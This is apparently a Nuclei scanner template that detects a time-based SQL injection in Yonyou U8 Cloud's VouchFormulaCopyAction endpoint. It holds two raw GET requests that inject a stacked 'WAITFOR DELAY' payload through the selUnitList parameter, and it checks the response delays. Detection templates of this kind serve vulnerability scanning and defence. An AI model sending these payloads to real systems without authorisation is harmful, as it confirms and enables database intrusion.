id: yongyouU8-Cloud-VouchFormulaCopyAction-sql-time

info:
  name: 用友U8 Cloud VouchFormulaCopyAction SQL注入漏洞
  author: yongyouU8
  severity: high
  tags: sql injection

http:
  - raw:
      - |
        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.hbbb.innertrade.VouchFormulaCopyAction&method=execute&selCopyUnitList=1&selUnitList=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A4%27--&selItemList=1 HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.hbbb.innertrade.VouchFormulaCopyAction&method=execute&selCopyUnitList=1&selUnitList=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A8%27--&selItemList=1 HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and